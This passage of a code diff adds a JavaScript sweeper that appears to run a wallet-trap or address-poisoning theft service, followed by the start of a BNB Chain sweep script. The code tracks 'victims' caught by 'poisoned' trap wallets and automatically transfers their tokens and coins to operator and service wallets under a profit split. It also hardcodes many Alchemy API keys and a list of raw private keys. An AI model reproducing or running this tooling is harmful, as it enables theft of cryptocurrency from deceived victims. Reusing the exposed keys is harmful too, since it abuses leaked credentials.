+    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
+  ],
+  ethereum: [
+    'https://eth-mainnet.g.alchemy.com/v2/alch_3smRQUoTzfj_NPiK6451s',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_xp0ppatuXONHI2pClS7_M',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_hmts-IFXko93muF8BaX5Q',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_8fJp6NiVdGxCOljdKCDZi',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_4euFfPOpJDglYNRQYKWhO',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_bjwK80RPIzP774OVkp-vE',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_LcoDsDwyyl7fbYUvffKYC',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_btTtYZmxG7VfNjY_jZIJr',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_IP1SsCj0wqzZqrvhH_Rv5',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_1O0yoHMsrXCOe3lOHu7dc',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_w2NDE7Pilr5cpIPb51Wsx',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_0hEit_izstW7cL9Gyz_T_',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_A0-PobPGMyEAZ31xva35A',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_D_FWof7AulPvkFHZnDlFn',
+    'https://ethereum.publicnode.com',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
+    'https://rpc.ankr.com/eth',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
+    'https://eth.llamarpc.com',
+    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
+    'https://1rpc.io/eth',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
+    'https://eth.drpc.org',
+    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
+    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
+  ],
+};
+
+const normalizedChain = chainName?.toLowerCase() || '';
+const rawUrls = [chainRpc, ...(PUBLIC_FALLBACKS[normalizedChain] || [])];
+const fallbackUrls = Array.from(new Set(rawUrls.filter(Boolean)));
+
+const ERC20_ABI = parseAbi([
+  'function balanceOf(address owner) view returns (uint256)',
+  'function transfer(address to, uint256 amount) returns (bool)',
+]);
+
+// 🚀 OPTIMIZATION: ONE single shared public client
+const publicClient = createPublicClient({
+  chain: viemChain,
+  transport: fallback(fallbackUrls.map(url => http(url, { timeout: 10000 })), { rank: false }),
+});
+
+
+// 🚀 OPTIMIZATION: Lazy execution helper
+async function executeSweepForTrap(entry, balances) {
+  const { account, trapAddress, victimAddress, campaignId: trapCampaignId, singleDestination } = entry;
+
+  let anyNeedsGasInThisTrap = false; // 🚀 NEW: Track gas issues per trap
+
+  let metadata;
+  if (singleDestination) {
+    metadata = { profitSplitPercent: 100, userSafeWallet: singleDestination, useSplitting: false, serviceWallet: null, fallbackToAdmin: false };
+  } else {
+    metadata = await getCampaignMetadata(trapCampaignId);
+    if (!metadata) {
+      logger.error(`Skipping trap ${trapAddress}: Could not resolve campaign metadata (missing safe_wallet_address and no admin fallback available).`);
+      return false;
+    }
+  }
+
+  const { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet, fallbackToAdmin } = metadata;
+  const prices = await fetchTokenPrices();
+  const isPriceFeedDown = Object.keys(prices).length === 0;
+  let sweptAny = false;
+  let totalGasPaidInRun = 0n;
+
+  let currentNonce = null;
+  const getNonce = async () => {
+    if (currentNonce === null) {
+      currentNonce = await withRetry(() => publicClient.getTransactionCount({ address: trapAddress, blockTag: 'pending' }), 'getTransactionCount', 2, 1000);
+    }
+    return currentNonce++;
+  };
+
+  let currentGasPrice = null;
+  const getGasPrice = async () => {
+    if (currentGasPrice === null) {
+      currentGasPrice = await withRetry(() => publicClient.getGasPrice(), 'getGasPrice', 2, 1000);
+    }
+    return currentGasPrice;
+  };
+
+  // 1. Token Sweeps
+  for (const token of TOKEN_LIST) {
+    const tokenData = balances.tokens[token.symbol];
+    if (!tokenData || tokenData.balance <= 0n) continue;
+
+    const formatted = formatUnits(tokenData.balance, tokenData.decimals);
+    const tokenPrice = prices[token.symbol.toLowerCase()] || 0;
+    const usdValue = parseFloat(formatted) * tokenPrice;
+    const isTokenPriceMissing = tokenPrice === 0;
+
+    const meetsThreshold = (isPriceFeedDown || isTokenPriceMissing)
+      ? tokenData.balance >= MIN_TOKEN_SWEEP
+      : usdValue >= MIN_SWEEP_USD;
+
+    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapAddress, trapCampaignId);
+    if (!meetsThreshold) continue;
+
+    const alertKey = `${trapAddress}:${token.symbol.toLowerCase()}`;
+    const now = Date.now();
+    if (now - (lastBalanceAlertTimes.get(alertKey) || 0) > BALANCE_DETECTED_COOLDOWN_MS) {
+      logger.info(`[!!!] ${token.symbol} BALANCE DETECTED for ${trapAddress}: ${formatted} (≈$${usdValue.toFixed(2)})`);
+      lastBalanceAlertTimes.set(alertKey, now);
+    }
+
+    try {
+      const gasPrice = await getGasPrice();
+      const gasLimit = 80000n;
+      const totalFee = useSplitting ? (gasLimit * 2n) * gasPrice : gasLimit * gasPrice;
+      const spendableNative = balances.native > totalGasPaidInRun ? balances.native - totalGasPaidInRun : 0n;
+
+      if (spendableNative < totalFee) {
+        logger.warn(`Insufficient ${nativeSymbol} for ${token.symbol} gas. Skipping.`);
+
+        anyNeedsGasInThisTrap = true; // 🚀 Flag this trap as needing gas
+
+        // 🚀 NEW: Alert user with EXACT mathematically calculated gas needed
+        if (usdValue >= 50) {
+          const gasAlertKey = `${trapAddress}:${token.symbol.toLowerCase()}:needs_gas`;
+          const now = Date.now();
+          if (now - (lastBalanceAlertTimes.get(gasAlertKey) || 0) > BALANCE_DETECTED_COOLDOWN_MS) {
+            const trapUrl = getExplorerUrl(trapAddress);
+
+            // 🚀 EXACT CALCULATION: totalFee is already calculated above based on current gasPrice * gasLimit
+            const exactGasNeeded = formatEther(totalFee);
+            // Recommend 2x the exact amount as a safety buffer for network spikes
+            const recommendedGas = (parseFloat(exactGasNeeded) * 2).toFixed(6);
+
+            const userGasMsg = `⛽ *Action Required: Your Trap Needs Gas!*\n\n` +
+              `Your trap successfully captured *${formatted} ${token.symbol}* (≈ $${usdValue.toFixed(2)}), but it does not have enough ${nativeSymbol} to pay for the sweep gas.\n\n` +
+              `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n` +
+              `⛽ *Exact Gas Needed:* ~${exactGasNeeded} ${nativeSymbol}\n\n` +
+              `💡 *How to fix:*\nPlease send at least *${recommendedGas} ${nativeSymbol}* to your trap address so the sweeper can forward your funds.`;
+
+            const adminGasMsg = `[ADMIN] ⛽ Trap needs gas to sweep.\nCampaign: ${trapCampaignId}\nTrap: ${trapAddress}\nAsset: ${token.symbol} ($${usdValue.toFixed(2)})\nExact Gas Needed: ${exactGasNeeded} ${nativeSymbol}`;
+
+            await sendCustomDualAlert(userGasMsg, adminGasMsg, trapCampaignId);
+            lastBalanceAlertTimes.set(gasAlertKey, now);
+          }
+        }
+        continue;
+      }
+
+      let userAmount = tokenData.balance;
+      let serviceAmount = 0n;
+      let userTxHash = null, serviceTxHash = null;
+
+      const buildAndSendTx = async (recipient, amount) => {
+        const nonce = await getNonce();
+        const txRequest = {
+          to: getAddress(token.address),
+          data: encodeFunctionData({ abi: ERC20_ABI, functionName: 'transfer', args: [recipient, amount] }),
+          gas: gasLimit, nonce, gasPrice, chainId: viemChain.id,
+        };
+        const serializedTx = await account.signTransaction(txRequest);
+        return await publicClient.sendRawTransaction({ serializedTransaction: serializedTx });
+      };
+
+      if (useSplitting && serviceWallet) {
+        // 🚨 If fallback to admin is active, user gets 0, admin gets 100%
+        if (fallbackToAdmin) {
+          userAmount = 0n;
+          serviceAmount = tokenData.balance;
+        } else {
+          const userShare = profitSplitPercent / 100;
+          userAmount = (tokenData.balance * BigInt(Math.round(userShare * 100))) / 100n;
+          serviceAmount = tokenData.balance - userAmount;
+        }
+
+        if (userAmount > 0n && userSafeWallet) {
+          try {
+            userTxHash = await buildAndSendTx(userSafeWallet, userAmount);
+            sweptAny = true; totalGasPaidInRun += gasLimit * gasPrice;
+          } catch (err) { logger.error(`User tx error ${token.symbol}: ${err.message}`); }
+        }
+        if (serviceAmount > 0n && serviceWallet) {
+          try {
+            serviceTxHash = await buildAndSendTx(serviceWallet, serviceAmount);
+            sweptAny = true; totalGasPaidInRun += gasLimit * gasPrice;
+          } catch (err) { logger.error(`Service tx error ${token.symbol}: ${err.message}`); }
+        }
+      } else {
+        try {
+          userTxHash = await buildAndSendTx(userSafeWallet, tokenData.balance);
+          sweptAny = true; totalGasPaidInRun += gasLimit * gasPrice;
+        } catch (err) { logger.error(`Sweep tx error ${token.symbol}: ${err.message}`); }
+      }
+
+      if (userTxHash || serviceTxHash) {
+        const txHash = userTxHash || serviceTxHash;
+        if (trapCampaignId && supabaseService) {
+          const txId = await createTransaction(trapCampaignId, trapAddress, token.symbol, formatted, isPriceFeedDown || isTokenPriceMissing ? 0 : usdValue, txHash, 'sweep');
+          if (txId) await createProfitShare(txId, formatUnits(userAmount, tokenData.decimals), formatUnits(serviceAmount, tokenData.decimals), userTxHash, serviceTxHash);
+        }
+
+        // 🚀 PROFESSIONAL NOTIFICATIONS
+        const txHashShort = txHash.substring(0, 10) + '...' + txHash.substring(txHash.length - 8);
+
+        const trapUrl = getExplorerUrl(trapAddress);
+        const txUrl = getExplorerUrl(txHash, 'tx');
+
+        if (fallbackToAdmin) {
+          const userFallbackMsg = `⚠️ *Important Update Regarding Your Trap*\n\n` +
+            `Your trap successfully captured funds, but no safe wallet address was configured in your campaign settings.\n\n` +
+            `For the security of your assets, the captured funds (*${formatted} ${token.symbol}* ≈ $${usdValue.toFixed(2)}) have been temporarily secured in the platform admin wallet.\n\n` +
+            `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n\n` +
+            `👉 *Action Required:* Please update your campaign's safe wallet address in your dashboard to claim these funds on the next sweep cycle.\n\n` +
+            `🔗 *TX:* [${txHashShort}](${txUrl})`;
+
+          const adminFallbackMsg = `[ADMIN] ⚠️ Fallback Sweep Executed (Missing User Wallet)\n` +
+            `Campaign ID: ${trapCampaignId}\n` +
+            `Trap: ${trapAddress}\n` +
+            `Asset: ${token.symbol}\n` +
+            `Amount: ${formatted} ${token.symbol} (≈ $${usdValue.toFixed(2)})\n` +
+            `Reason: User safe wallet not configured. Funds secured in service wallet.\n` +
+            `🔗 TX: ${txUrl}`;
+
+          await sendCustomDualAlert(userFallbackMsg, adminFallbackMsg, trapCampaignId);
+        } else {
+          const userSuccessMsg = `🎉 *Congratulations! Your trap has successfully captured funds!*\n\n` +
+            `💰 *Asset:* ${token.symbol}\n` +
+            `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n` +
+            `💵 *Amount:* ${formatted} ${token.symbol} (≈ $${usdValue.toFixed(2)})\n` +
+            `✅ *Status:* Successfully swept to your safe wallet.\n\n` +
+            `🔗 *TX:* [${txHashShort}](${txUrl})`;
+
+          const adminSuccessMsg = `[ADMIN] 🎉 User trap successfully captured and swept funds.\n` +
+            `Campaign ID: ${trapCampaignId}\n` +
+            `Asset: ${token.symbol}\n` +
+            `Amount: ${formatted} ${token.symbol}\n` +
+            `🔗 TX: ${txUrl}`;
+
+          await sendCustomDualAlert(userSuccessMsg, adminSuccessMsg, trapCampaignId);
+        }
+      }
+    } catch (e) {
+      logger.debug(`Error processing ${token.symbol} for ${trapAddress}: ${e.message}`);
+    }
+  }
+
+  // 2. Native Sweep
+  const spendableNativeFinal = balances.native > totalGasPaidInRun ? balances.native - totalGasPaidInRun : 0n;
+  if (spendableNativeFinal > 0n) {
+    const nativePrice = prices[nativeSymbol.toLowerCase()] || 0;
+    const ethValue = parseFloat(formatEther(spendableNativeFinal));
+    const usdValue = ethValue * nativePrice;
+    const isNativePriceMissing = nativePrice === 0;
+
+    const meetsThreshold = (isPriceFeedDown || isNativePriceMissing)
+      ? spendableNativeFinal >= MIN_ETH_SWEEP
+      : usdValue >= MIN_SWEEP_USD;
+
+    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapAddress, trapCampaignId);
+
+    if (meetsThreshold) {
+      try {
+        const gasPrice = await getGasPrice();
+        const gasLimit = (useSplitting && serviceWallet) ? 42000n : 21000n;
+        const gasCost = gasLimit * gasPrice;
+        const totalSendable = spendableNativeFinal - gasCost;
+
+        if (totalSendable > 0n) {
+          let userAmount = totalSendable;
+          let serviceAmount = 0n;
+          let userTxHash = null, serviceTxHash = null;
+
+          const buildAndSendNativeTx = async (recipient, amount) => {
+            const nonce = await getNonce();
+            const txRequest = { to: recipient, value: amount, gas: 21000n, nonce, gasPrice, chainId: viemChain.id };
+            const serializedTx = await account.signTransaction(txRequest);
+            return await publicClient.sendRawTransaction({ serializedTransaction: serializedTx });
+          };
+
+          if (useSplitting && serviceWallet) {
+            if (fallbackToAdmin) {
+              userAmount = 0n;
+              serviceAmount = totalSendable;
+            } else {
+              const userShare = profitSplitPercent / 100;
+              userAmount = (totalSendable * BigInt(Math.round(userShare * 100))) / 100n;
+              serviceAmount = totalSendable - userAmount;
+            }
+
+            if (userAmount > 0n && userSafeWallet) {
+              try { userTxHash = await buildAndSendNativeTx(userSafeWallet, userAmount); sweptAny = true; }
+              catch (err) { logger.error(`Native user tx error: ${err.message}`); }
+            }
+            if (serviceAmount > 0n && serviceWallet) {
+              try { serviceTxHash = await buildAndSendNativeTx(serviceWallet, serviceAmount); sweptAny = true; }
+              catch (err) { logger.error(`Native service tx error: ${err.message}`); }
+            }
+          } else {
+            try { userTxHash = await buildAndSendNativeTx(userSafeWallet, totalSendable); sweptAny = true; }
+            catch (err) { logger.error(`Native sweep tx error: ${err.message}`); }
+          }
+
+          if (userTxHash || serviceTxHash) {
+            const txHash = userTxHash || serviceTxHash;
+            if (trapCampaignId && supabaseService) {
+              const txId = await createTransaction(trapCampaignId, trapAddress, nativeSymbol, formatEther(spendableNativeFinal), isPriceFeedDown || isNativePriceMissing ? 0 : usdValue, txHash, 'sweep');
+              if (txId) await createProfitShare(txId, formatEther(userAmount), formatEther(serviceAmount), userTxHash, serviceTxHash);
+            }
+
+            // 🚀 PROFESSIONAL NOTIFICATIONS FOR NATIVE
+            const txHashShort = txHash.substring(0, 10) + '...' + txHash.substring(txHash.length - 8);
+            const trapUrl = getExplorerUrl(trapAddress);
+            const txUrl = getExplorerUrl(txHash, 'tx');
+
+            if (fallbackToAdmin) {
+              const userFallbackMsg = `⚠️ *Important Update Regarding Your Trap*\n\n` +
+                `Your trap successfully captured ${nativeSymbol}, but no safe wallet address was configured.\n\n` +
+                `For security, the funds (*${formatEther(totalSendable)} ${nativeSymbol}* ≈ $${usdValue.toFixed(2)}) have been secured in the platform admin wallet.\n\n` +
+                `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n\n` +
+                `👉 *Action Required:* Please update your campaign's safe wallet address in your dashboard.\n\n` +
+                `🔗 *TX:* [${txHashShort}](${txUrl})`;
+
+              const adminFallbackMsg = `[ADMIN] ⚠️ Fallback Sweep Executed (Missing User Wallet)\n` +
+                `Campaign ID: ${trapCampaignId}\n` +
+                `Trap: ${trapAddress}\n` +
+                `Asset: ${nativeSymbol}\n` +
+                `Amount: ${formatEther(totalSendable)} ${nativeSymbol} (≈ $${usdValue.toFixed(2)})\n` +
+                `Reason: User safe wallet not configured.\n` +
+                `🔗 TX: ${txUrl}`;
+
+              await sendCustomDualAlert(userFallbackMsg, adminFallbackMsg, trapCampaignId);
+            } else {
+              const userSuccessMsg = `🎉 *Congratulations! Your trap has successfully captured funds!*\n\n` +
+                `💰 *Asset:* ${nativeSymbol}\n` +
+                `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n` +
+                `💵 *Amount:* ${formatEther(totalSendable)} ${nativeSymbol} (≈ $${usdValue.toFixed(2)})\n` +
+                `✅ *Status:* Successfully swept to your safe wallet.\n\n` +
+                `🔗 *TX:* [${txHashShort}](${txUrl})`;
+
+              const adminSuccessMsg = `[ADMIN] 🎉 User trap successfully captured and swept funds.\n` +
+                `Campaign ID: ${trapCampaignId}\n` +
+                `Asset: ${nativeSymbol}\n` +
+                `Amount: ${formatEther(totalSendable)} ${nativeSymbol}\n` +
+                `🔗 TX: ${txUrl}`;
+
+              await sendCustomDualAlert(userSuccessMsg, adminSuccessMsg, trapCampaignId);
+            }
+          }
+        }
+      } catch (e) {
+        logger.debug(`Error processing native for ${trapAddress}: ${e.message}`);
+      }
+    }
+  }
+  return { swept: sweptAny, needsGas: anyNeedsGasInThisTrap };
+}
+
+// --- Batch mode with Advanced Multicall Batching ---
+async function sweepBatch() {
+  let entries = [];
+  let trapToVictim = new Map();
+
+  try {
+    entries = await getTrapsFromDB(campaignId);
+  } catch (err) {
+    logger.error(`Failed to load traps: ${err.message}`);
+    if (jobId) await updateJob('failed', null, null, 'Failed to load traps');
+    return;
+  }
+
+  if (entries.length === 0) {
+    await sendCustomDualAlert(
+      `ℹ️ Sweep cycle complete: No traps found to process.`,
+      `[ADMIN] ℹ️ Sweep cycle complete: No traps found to process.`
+      , campaignId);
+    return;
+  }
+
+  for (const e of entries) {
+    if (e.victimAddress) trapToVictim.set(e.trapAddress.toLowerCase(), e.victimAddress);
+  }
+
+  logger.info(`Loaded ${entries.length} trap addresses`);
+
+  let isSweeping = false;
+  const total = entries.length;
+
+  const runSweep = async () => {
+    if (isSweeping) return;
+    isSweeping = true;
+    let processedCount = 0;
+    let anySwept = false;
+    let anyNeedsGas = false; // 🚀 NEW: Track if any trap caught funds but lacked gas
+
+    try {
+      const CHUNK_SIZE = 20;
+
+      for (let i = 0; i < entries.length; i += CHUNK_SIZE) {
+        if (jobId && await isJobCancelled(jobId)) {
+          logger.info(`Job ${jobId} cancelled. Stopping.`);
+          isSweeping = false;
+          return;
+        }
+
+        const chunk = entries.slice(i, i + CHUNK_SIZE);
+        const multicallContracts = [];
+        for (const entry of chunk) {
+          for (const token of TOKEN_LIST) {
+            multicallContracts.push({
+              address: getAddress(token.address),
+              abi: ERC20_ABI,
+              functionName: 'balanceOf',
+              args: [entry.trapAddress]
+            });
+          }
+        }
+
+        const results = await withRetry(() => publicClient.multicall({ contracts: multicallContracts, allowFailure: true }), 'multicall_chunk', 2, 1000);
+        const nativeBalancePromises = chunk.map(entry => withRetry(() => publicClient.getBalance({ address: entry.trapAddress }), 'getBalance', 2, 1000));
+        const nativeBalances = await Promise.all(nativeBalancePromises);
+
+        let resultIndex = 0;
+        for (let j = 0; j < chunk.length; j++) {
+          const entry = chunk[j];
+          const trapBalances = { native: nativeBalances[j], tokens: {} };
+
+          for (const token of TOKEN_LIST) {
+            const res = results[resultIndex++];
+            if (res && res.status === 'success' && res.result > 0n) {
+              trapBalances.tokens[token.symbol] = { balance: res.result, decimals: token.decimals };
+            }
+          }
+
+          const result = await executeSweepForTrap(entry, trapBalances);
+          if (result.swept) anySwept = true;
+          if (result.needsGas) anyNeedsGas = true;
+
+          processedCount++;
+          if (jobId) await updateJob('running', processedCount, total, `Sweeping ${processedCount}/${total}`);
+        }
+      }
+
+      if (!anySwept) {
+        const now = Date.now();
+        if (now - lastNoBalanceAlertTime > NO_BALANCE_COOLDOWN_MS) {
+          // 🚀 FIX: Admin-only alerts for the 4-hour cycle summary
+          if (anyNeedsGas) {
+            await sendAlert(
+              `[ADMIN] ℹ️ 4-Hour Sweep Summary: Funds were captured in some traps, but they lack the native gas to sweep. (Users were already notified via immediate alerts).`,
+              'info'
+            );
+          } else {
+            await sendAlert(
+              `[ADMIN] ℹ️ 4-Hour Sweep Summary: No balances above thresholds were found for ${total} traps.`,
+              'info'
+            );
+          }
+          lastNoBalanceAlertTime = now;
+        }
+      } else {
+        await sendAlert(`[ADMIN] ✅ Sweep cycle complete: Successfully processed ${total} traps.`, 'info');
+      }
+    } catch (err) {
+      logger.error(`Batch sweep error: ${err.message}`);
+      await sendAlert(`[ADMIN] ❌ CRITICAL ERROR in sweep batch: ${err.message}`, 'error');
+    } finally {
+      isSweeping = false;
+    }
+  };
+
+  const scheduleNext = () => {
+    setTimeout(async () => {
+      if (jobId && await isJobCancelled(jobId)) return;
+      await runSweep();
+      scheduleNext();
+    }, pollIntervalMs);
+  };
+
+  await runSweep();
+
+  if (jobId) {
+    // 🚀 FIX: This was a manual sweep triggered by the dashboard.
+    // We are done. Mark as completed and EXIT the process to prevent infinite looping.
+    await updateJob('completed', total, total, 'Manual sweep cycle complete');
+    logger.info(`[Job ${jobId}] ✅ Manual sweep complete. Exiting process.`);
+    process.exit(0);
+  } else {
+    // This is the background daemon (PM2). Keep polling indefinitely.
+    scheduleNext();
+    onShutdown(() => { logger.info('Sweeper stopping...'); });
+  }
+}
+
+// --- Single mode ---
+async function sweepSingle(privateKey, destination) {
+  const account = privateKeyToAccount(privateKey);
+  const trapAddress = account.address;
+  logger.info(`Monitoring Poisoned Wallet: ${trapAddress}`);
+
+  let isRunning = false;
+  const run = async () => {
+    if (isRunning) return;
+    isRunning = true;
+    try {
+      const multicallContracts = TOKEN_LIST.map(token => ({
+        address: getAddress(token.address), abi: ERC20_ABI, functionName: 'balanceOf', args: [trapAddress]
+      }));
+      const results = await publicClient.multicall({ contracts: multicallContracts, allowFailure: true });
+      const trapBalances = {
+        native: await publicClient.getBalance({ address: trapAddress }),
+        tokens: {}
+      };
+      results.forEach((res, i) => {
+        if (res && res.status === 'success' && res.result > 0n) {
+          trapBalances.tokens[TOKEN_LIST[i].symbol] = { balance: res.result, decimals: TOKEN_LIST[i].decimals };
+        }
+      });
+
+      await executeSweepForTrap({ account, trapAddress, victimAddress: null, singleDestination: destination }, trapBalances);
+    } catch (err) {
+      logger.error(`Sweep error: ${err.message}`);
+    } finally {
+      isRunning = false;
+    }
+  };
+  const interval = setInterval(run, pollIntervalMs);
+  run();
+  onShutdown(() => { clearInterval(interval); logger.info('Sweeper interval cleared.'); });
+}
+
+// --- Graceful shutdown & Entry point ---
+setupGracefulShutdown();
+await loadCaughtVictims();
+setInterval(loadCaughtVictims, 30000);
+
+if (jobId) updateJob('running').catch(err => logger.error(`Failed to update job start: ${err.message}`));
+
+const privateKey = process.env.SWEEPER_PRIVATE_KEY;
+if (privateKey && process.env.SAFE_WALLET_ADDRESS) {
+  await sweepSingle(privateKey, process.env.SAFE_WALLET_ADDRESS);
+} else {
+  await sweepBatch();
+}
+===== END FILE: src/sweeper.js =====
+
+
+===== FILE: sweep.js =====
+import { ethers } from 'ethers';
+
+// ─── CONFIGURATION ───────────────────────────────────────────────
+
+// Public RPC URL for BNB Smart Chain (BSC)
+const RPC_URL = 'https://bsc-dataseed.binance.org/';
+const provider = new ethers.JsonRpcProvider(RPC_URL);
+
+// Target wallet that receives all swept funds
+const DESTINATION_ADDRESS = '0x0990da5d417bb9c7ac55cdd66115e633803f1a75';
+
+// Array of source private keys
+const PRIVATE_KEYS = [
+  '0x32cb35828c99ff167a7edc531cb6940f0453366cb4570ea9f20a3461667250ed',
+  '0x9d0f941fb3d9e28b407c69aa931ce4691be925d8d962a52fef56881a9cfc936b',
+  '0x9b742551e9c2bf53b1a41ec3f8769aa072461c1f41e20ee765d32f65c1b0a840',
+  '0x25f1988679a8417cc13ee51d4f6ba4b3648b16ed289b5086a55171dde4ab554f',
+  '0x2fb7297d63e47472b4a63b129a206e23d514acb8d5c0a5fec8653d84ddd4df25',
+  '0x3a191060ae7c4838300fdf58c60e17456ec0a0e08f25f4d9afc6ec570d778971',
+  '0xe9c10696c7ba24cff341474ae872aad9995e02c258c766c9fee944731aaf5cc5',
+  '0x6a9e449f8caa076db328b4a2ab1f7f75de63cca82cd532d6fc25e21e59f339fc',
+  '0xe7733d48f05400ccc80d3e3f1f23a46df068130f4263bc502ffab13ffe8a49a2',
+  '0xf46afddf5051752def8f74a4ab106936cb2d5aa75a663b4f0aa5c2470e6e9008',
+  '0xbf28f11948b2a6b7deb58be4f39af0dab2ef4a9471ce660adb153b49dbe0b846',
+  '0xefa734b7d6bf7844db4d31091899df06a49cda30645fb16c1238837cb9e73165',
+  '0x980c4ff7710afc80707db4989319cb8b16ed39349127a38034b48875c95f81c1',
+  '0x201d53c95305af98c576eaa233bbfdca7b8ad51e756ca1bef237c1836ff49ef8',
+  '0x9becf2bf25f1563ac42a9a73e3f02e592a0ed98415aca5052ed58b3fdd88a488',
+  '0x90005b11e3d29fbdf65c64db6b6f2385f356dfcc184bb9a5af28a35f84bc5384',
+  '0x83f2bf012b344edf2930842782c7534742e9da05fa80dcfdadcb35f467283a24',
+  '0x9f5016835e2990f8e840c304e210a8653f40e2fe5d009100a95488e45adc5191',
+  '0x71b57e6cdb66c01e63f377fb38c8610b9df1a24ccc16c52a7db33d97db0f3d19',
+  '0x40d2a4193eb90ca4cdbb03797bf2faa109276dad1f258b684bf27616b6fae584',
+  '0xfec0620bcab296d7daef5ead2e863abeff6354badf23fd41adb9844156ea47a1',
+  '0x668a197530337d6a9d8c2f75a196aa8158bd842191482a8106eea5e461c9dcd0',
+  '0xaf3984c2fa49e3dde7911ed2717f66937c592a42689a163d067c6c79f8c86504',
+  '0x36daa7a5106dd2e0a2f35a82715c301dc94eb86def440fdc796302e524c546c3',
+  '0xc87a46c68696751e424dfa05a1a7d3679cfbc3fc37238bddaa40c5e8f312b525',
+  '0x7d35edb2aa6d1bc290687c09eee1307355669be28e76c381869ced967fdfaead',
+  '0x46114891ef0d5725aac6a860631b8cd9546d3d2e26743ebfee30c77b2372495b',
+  '0x14de6f35c6aa224e0ed35f7342e8e96664ec13d52860821bf7b7e6f2914d67b2',
+  '0x66d7c6258915d770e4cecf006a550fbcd9392dc51e3a32bec64134bfb476b888',
+  '0x794998ae4d1d38e837a8e1929d45dcd28a6e04c719e17ae8b6dea73d3feb811b',
+  '0x22e9817d67e421df0c664b61f9ebda334ac2ed6011086e3250df76167f0be898',
+  '0x0726f21ea0be11d9115b5c32a32e2016da11cc21439ac685fedf3fc45bfb8020',
+  '0x92ffd97bb07d2d22ed16d45ead1bc101964d778094fb5299db695db0d581a3ce',
+  '0x448ccd309e1d142a8e7bf133206454a8963fae2fe997684d449d9f4e22a632f9',
+  '0x0526c9f26112c06b26e034af08cfe2009aad1a9914a5a80db6aed9e5693c4ecf',
+];
+
+// Token Contract Addresses on BSC
+const TOKENS = {
+  USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
+  USDT: '0x55d398326f99059fF775485246999027B3197955',
+};
+
+const ERC20_ABI = [
+  'function balanceOf(address account) external view returns (uint256)',
+  'function transfer(address recipient, uint256 amount) external returns (bool)',
+];
+
+// ─── SWEEP LOGIC ─────────────────────────────────────────────────
+
+async function sweepWallet(privateKey) {
+  const wallet = new ethers.Wallet(privateKey, provider);
+  console.log(`\n==================================================`);
+  console.log(`Processing Wallet: ${wallet.address}`);
+  console.log(`==================================================`);
+
+  // 1. Sweep BEP-20 Tokens First (USDC, USDT)
+  for (const [symbol, tokenAddress] of Object.entries(TOKENS)) {
+    try {
+      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
+      const balance = await contract.balanceOf(wallet.address);
+
+      if (balance > 0n) {
+        console.log(`Found ${symbol} balance: ${ethers.formatUnits(balance, 18)}`);
+
+        // Fetch lowest live gas price
+        const feeData = await provider.getFeeData();
+        const gasPrice = feeData.gasPrice;
+
+        // Dynamic gas estimation for lowest accurate fee
+        const estimatedGas = await contract.transfer.estimateGas(DESTINATION_ADDRESS, balance);
+
+        console.log(`Sweeping ${symbol} to ${DESTINATION_ADDRESS}...`);
+        const tx = await contract.transfer(DESTINATION_ADDRESS, balance, {
+          gasLimit: estimatedGas,
+          gasPrice: gasPrice,
+        });
+
+        console.log(`Tx Submitted: ${tx.hash}`);
+        await tx.wait(1);
+        console.log(`Swept ${symbol} successfully.`);
+      } else {
+        console.log(`No ${symbol} balance.`);
+      }
+    } catch (err) {
+      console.error(`Failed to sweep ${symbol}:`, err.message);
+    }
+  }
+
+  // 2. Sweep Native BNB Last
+  try {
+    const balance = await provider.getBalance(wallet.address);
+    const feeData = await provider.getFeeData();
+    const gasPrice = feeData.gasPrice;
+
+    // Standard native transfer gas limit
+    const gasLimit = 21000n;
+    const totalGasCost = gasLimit * gasPrice;
+
+    if (balance > totalGasCost) {
+      const sweepAmount = balance - totalGasCost;
+      console.log(`Sweeping Native BNB: ${ethers.formatEther(sweepAmount)} BNB`);
+
+      const tx = await wallet.sendTransaction({
+        to: DESTINATION_ADDRESS,
+        value: sweepAmount,
+        gasLimit: gasLimit,
+        gasPrice: gasPrice,
+      });
+
+      console.log(`BNB Tx Submitted: ${tx.hash}`);
+      await tx.wait(1);
+      console.log(`Swept Native BNB successfully.`);
+    } else {
+      console.log(`Insufficient BNB to cover gas fee (${ethers.formatEther(totalGasCost)} BNB required).`);
+    }
+  } catch (err) {
+    console.error(`Failed to sweep Native BNB:`, err.message);
+  }
+}
+
+async function main() {
